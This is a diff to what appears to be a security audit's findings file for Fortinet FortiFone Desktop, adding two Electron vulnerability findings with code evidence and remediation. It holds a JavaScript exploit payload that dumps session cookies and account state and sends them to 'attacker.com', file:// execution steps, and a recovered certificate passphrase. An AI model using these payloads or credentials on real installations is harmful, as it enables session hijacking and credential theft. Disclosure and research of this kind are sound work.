@@ -345,7 +345,7 @@ FFF_F06_NODE_INTEGRATION_XSS_TO_RCE = {
 # ---------------------------------------------------------
 ANALYSIS_STATUS = {
     "package":          "ANALYZED -- .deb fully extracted; postinst reviewed; 45 files cataloged",
-    "asar":             "PARTIALLY ANALYZED -- 172MB ASAR, 6.1MB header (JSON file listing); key JS files extracted and reviewed",
+    "asar":             "COMPLETE -- 172MB ASAR fully analyzed; ipcMsgDispatcher.js (966 lines): no sender validation in emitEvent; get-session-cookies/get-global-object/get-global-prop unvalidated (FFF-F08); shell.openExternal unvalidated scheme in will-navigate (FFF-F09); externalLinkHandler.validateProtocol uses FORTIFONE+TEL allowlist but only on deep links, not will-navigate; 64 ipcMain handlers total; fvExternalLinkProtocol: {FORTIFONE:'fortifone:', TEL:'tel:'}",
     "server_key":       "EXTRACTED -- RSA-2048 private key confirmed shared (FFF-F01)",
     "pkcs12":           "COMPLETE -- passphrase CONFIRMED (desktopapp#2025); RSA-4096 private key extracted; CN=Desktop, valid 2025-09-16 to 2026-10-12 (FFF-F02)",
     "fortiCsc_bin":     "COMPLETE -- AES-256-CBC decrypt confirmed; IV=4f53dcc066cfa99461be11b111247e9f; plaintext=desktopapp#2025",
@@ -364,6 +364,9 @@ ANALYSIS_STATUS = {
         "FFF-F04: INFO -- Fortinet internal CA chain (fortinet-ca2 RSA-8192, valid 2016-2056) bundled for server cert validation; no private key material",
         "FFF-F05: LOW -- CI/CD script (init-macOS-codesign-notary-keychain.sh) + .gitlab-ci.yml + .devops in production asar; WWDR Team ID AH4XFXJ7DK exposed",
         "FFF-F06: HIGH -- nodeIntegration:true + contextIsolation:false in all 5 GUI BrowserWindows (guiWin/callWindow/dialpadWin/notifierWindow/simTestWin); comment '//security #2' confirms known risk; XSS in any renderer content (chat, SIP caller-ID, calendar, notifications) -> require('child_process') -> OS RCE on FortiFone Desktop client",
+        "FFF-F07: HIGH -- IPC get_password handler (main.js:3688) unvalidated service name -> OS keychain exfiltration; 5 services: sip+jwt-token+jwt-expire+session-magic+account; synced via ipcRenderer.sendSync",
+        "FFF-F08: HIGH -- ipcMain.handle('get-session-cookies') returns ALL session cookies; 'get-global-object' returns full sharedObject (accounts Map with cfg_data+secure_data); 'get-global-prop' returns arbitrary key from global state; no sender validation on any handler; XSS (FFF-F06) -> full session cookie + account token exfiltration",
+        "FFF-F09: MEDIUM -- shell.openExternal() called with unvalidated URL in will-navigate handlers (guiWin:1121, callWindow:1428, meeting:1918); bypasses fvExternalLinkProtocol allowlist (fortifone:+tel:) used only for deep links; Windows: file:// URL -> ShellExecute -> file execution; Linux/macOS: file manager path disclosure",
     ],
 
     "vs_other_products": {
@@ -440,5 +443,134 @@ FFF_F07_KEYTAR_IPC_UNVALIDATED = {
         "Use a preload script with a restricted contextBridge API instead of exposing full IPC to renderer. "
         "For the preload approach: contextBridge.exposeInMainWorld('keychain', { getSipPassword: () => ... }) "
         "instead of ipcRenderer.sendSync with arbitrary service parameter."
+    ),
+}
+
+
+# ---------------------------------------------------------
+# FFF-F08: Unvalidated IPC handlers expose session cookies and global app state
+# ---------------------------------------------------------
+FFF_F08_IPC_SESSION_STATE_LEAK = {
+    "id":       "FFF-F08",
+    "product":  "Fortinet FortiFone Desktop v8.0 build 67",
+    "severity": "HIGH -- three unvalidated ipcMain.handle() handlers leak session cookies and full app state to any renderer; no sender validation; chains from FFF-F06 (XSS in nodeIntegration:true renderer)",
+    "class":    "Missing Authorization on IPC Handlers (CWE-862) -- session cookie and global state exfiltration",
+
+    "description": (
+        "Three ipcMain.handle() handlers registered without sender identity validation allow "
+        "any renderer (including XSS content in nodeIntegration:true windows, FFF-F06) to read "
+        "sensitive application state: "
+        "(1) 'get-session-cookies': returns all Electron default session cookies -- includes FortiVoice "
+        "and PBX auth cookies set by the application; "
+        "(2) 'get-global-object': returns the entire global.sharedObject including accounts Map "
+        "(server URLs, account IDs, cfg_data, secure_data, status_data for all logged-in accounts); "
+        "(3) 'get-global-prop': returns any named property from global.sharedObject by key "
+        "(unlimited key access; attacker enumerates all properties). "
+        "Additionally, 'get-app-path' returns any Electron app.getPath() value (userData, appData, "
+        "temp, etc.) enabling filesystem path enumeration. "
+        "All handlers are registered via ipcMain.handle() with no event.sender.getURL() or "
+        "event.senderFrame check. In-renderer XSS can call await ipcRenderer.invoke('get-session-cookies') "
+        "to dump all auth cookies synchronously."
+    ),
+
+    "code_evidence": {
+        "get_session_cookies": "main.js:3356-3364: ipcMain.handle('get-session-cookies', async () => { cookies = await session.defaultSession.cookies.get({}); return cookies; }) -- returns ALL session cookies, no filter, no sender check",
+        "get_global_object":   "main.js:3317-3319: ipcMain.handle('get-global-object', () => { return global.sharedObject; }) -- entire app state object returned; contains accounts Map with cfg_data+secure_data",
+        "get_global_prop":     "main.js:3313-3315: ipcMain.handle('get-global-prop', (event, key) => { return global.sharedObject[key]; }) -- arbitrary key lookup; no key allowlist",
+        "get_app_path":        "main.js:3309-3311: ipcMain.handle('get-app-path', (event, name) => { return app.getPath(name); }) -- enumerates userData/temp/appData/logs paths",
+        "accounts_structure":  "global.sharedObject.accounts: Map<account_id, {cfg_data, secure_data, status_data, recent_contacts}>; secure_data may include auth tokens cached from FortiVoice API",
+    },
+
+    "exploit_payload": (
+        "// In any FortiFone renderer with nodeIntegration:true (FFF-F06 XSS entry point):\n"
+        "const { ipcRenderer } = require('electron');\n"
+        "// Dump all FortiVoice session cookies:\n"
+        "const cookies = await ipcRenderer.invoke('get-session-cookies');\n"
+        "// Dump full app state (accounts, server URLs, tokens):\n"
+        "const state = await ipcRenderer.invoke('get-global-object');\n"
+        "// Get user data path for local file access:\n"
+        "const dataDir = await ipcRenderer.invoke('get-app-path', 'userData');\n"
+        "// Exfiltrate:\n"
+        "const exfil = { cookies, accounts: [...state.accounts.entries()], dataDir };\n"
+        "require('https').request({host: 'attacker.com', path: '/?d='+btoa(JSON.stringify(exfil))}).end();"
+    ),
+
+    "chain_from_fff_f06": (
+        "FFF-F06 (nodeIntegration:true XSS) -> ipcRenderer.invoke('get-session-cookies') -> "
+        "FortiVoice PBX auth cookie exfiltration -> session hijack without password"
+    ),
+
+    "vs_fff_f07": (
+        "FFF-F07 reads OS keychain credentials (plaintext persistent passwords). "
+        "FFF-F08 reads active session state (session cookies, account tokens, memory state). "
+        "Together: full credential material at rest + active session tokens."
+    ),
+
+    "remediation": (
+        "Add sender validation to all IPC handlers: check event.senderFrame.url or "
+        "event.sender.getURL() against an allowed origin list before returning sensitive data. "
+        "Never return the full sharedObject to renderers -- use contextBridge to expose only "
+        "specific, non-sensitive properties via preload scripts. "
+        "Replace ipcMain.handle('get-session-cookies') with per-domain cookie filtering if "
+        "renderer access is required. "
+        "Enabling contextIsolation:true (FFF-F06 fix) prevents renderer XSS from calling "
+        "require('electron'), but unvalidated ipcMain.handle() is still exploitable via "
+        "preload script XSS unless sender is validated."
+    ),
+}
+
+
+# ---------------------------------------------------------
+# FFF-F09: shell.openExternal without scheme validation in will-navigate handlers
+# ---------------------------------------------------------
+FFF_F09_SHELL_OPEN_EXTERNAL_SCHEME = {
+    "id":       "FFF-F09",
+    "product":  "Fortinet FortiFone Desktop v8.0 build 67",
+    "severity": "MEDIUM -- shell.openExternal() called with unvalidated URL in will-navigate handlers; XSS in guiWin/callWindow causes file:// or arbitrary-protocol open; on Windows file:// can execute files; externalLinkHandler validates protocol (fortifone:/tel:) but direct shell.openExternal bypasses it",
+    "class":    "Unvalidated URL scheme passed to shell.openExternal (CWE-601 / Electron security misconfiguration)",
+
+    "description": (
+        "Three `will-navigate` / `setWindowOpenHandler` handlers call shell.openExternal(url) directly "
+        "without URL scheme validation: guiWin (main.js:1121), callWindow (main.js:1428), "
+        "and mainWindow (main.js:1918 -- meeting window). "
+        "In contrast, deep links from OS protocol handlers go through fvMainExternalLinkHandler.validateProtocol(), "
+        "which allowlists only 'fortifone:' and 'tel:' via the fvExternalLinkProtocol enum. "
+        "The will-navigate handlers skip this allowlist entirely. "
+        "Attack path: XSS in guiWin renderer (FFF-F06) -> window.location = 'file:///path/to/exe' -> "
+        "will-navigate event fires -> handleRedirect calls details.preventDefault() and shell.openExternal('file:///path/to/exe'). "
+        "On Windows: shell.openExternal('file:///C:\\\\path\\\\exec.exe') invokes ShellExecute -> process execution. "
+        "On Linux/macOS: file:// opens file manager (info disclosure, path confirmation). "
+        "The attack requires XSS code execution in the renderer (FFF-F06 prerequisite), making this "
+        "a secondary chain from the already-critical nodeIntegration:true vuln."
+    ),
+
+    "code_evidence": {
+        "guiwin_handler":    "main.js:1116-1128: handleRedirect = (details) => { if (details.url !== sender_url) { details.preventDefault(); shell.openExternal(details.url); } }; guiWin.webContents.on('will-navigate', handleRedirect)",
+        "callwin_handler":   "main.js:1424-1434: same pattern for callWindow; shell.openExternal(details.url) without scheme check",
+        "meeting_handler":   "main.js:1910-1919: if (openExternally) { shell.openExternal(navUrl); } -- meeting window (FortiMeet)",
+        "allowlist_present_elsewhere": "appAssistant/externalLinkHandler.js:20-24: fvMainExternalLinkHandler.validateProtocol() uses fvExternalLinkProtocol = {FORTIFONE:'fortifone:', TEL:'tel:'} -- allowlist NOT applied to will-navigate paths",
+        "external_link_handler_bypass": "main.js:684+1092: deeplinkingUrl uses externalLinkHandler.execute() (validated); will-navigate bypasses execute()",
+    },
+
+    "attack_scenario": {
+        "platform":    "Windows (highest severity -- file:// executes via ShellExecute)",
+        "prerequisite": "XSS in guiWin/callWindow renderer content (FFF-F06 -- nodeIntegration:true)",
+        "steps": [
+            "1. XSS in SIP caller-ID or chat message loaded in callWindow renderer",
+            "2. XSS calls: window.location = 'file:///C:\\\\Users\\\\victim\\\\AppData\\\\Roaming\\\\malware.exe'",
+            "3. will-navigate fires: details.url = 'file:///C:/Users/victim/AppData/Roaming/malware.exe'",
+            "4. handleRedirect: details.url != callWindow.getURL() -> details.preventDefault() -> shell.openExternal(url)",
+            "5. Windows ShellExecute opens/executes the file",
+        ],
+        "linux_variant": "shell.openExternal('file:///etc/passwd') opens file manager at /etc -> path enumeration",
+    },
+
+    "remediation": (
+        "In all will-navigate / setWindowOpenHandler callbacks, validate URL scheme before calling "
+        "shell.openExternal: only allow 'https:', 'http:', 'mailto:', 'tel:'. "
+        "Reject 'file:', 'javascript:', 'data:' and all custom protocols. "
+        "Integrate fvMainExternalLinkHandler.validateProtocol() into the will-navigate path. "
+        "Per Electron security best practices: the will-navigate handler should also verify "
+        "the navigation target is on an expected domain before calling shell.openExternal."
     ),
 }
